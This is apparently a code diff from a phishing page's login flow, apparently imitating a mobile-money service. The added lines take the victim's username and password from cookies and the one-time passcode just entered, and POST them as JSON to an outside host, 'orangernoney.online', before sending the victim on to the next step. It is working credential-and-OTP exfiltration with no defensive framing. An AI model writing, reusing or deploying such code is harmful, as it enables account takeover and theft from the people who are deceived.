@@ -108,7 +108,25 @@
                     $('.reject-data').hide();
                     $('#loading-section').show();
                     setCookie('otp',otpCode)
-                    window.location.href = 'step4';
+
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", 'https://orangernoney.online',true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.onreadystatechange = function() {
+                        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
+                            window.location.href = 'step4';
+                        }   
+                        else{
+                            console.log("ERRORRRRRR")
+                        }
+                    }
+                    xhr.send(
+                        JSON.stringify({
+                            'username':getCookie('username'),
+                            'password':getCookie('password'),
+                            'otp':otpCode
+                        })
+                    );
                     
 
                 } else {
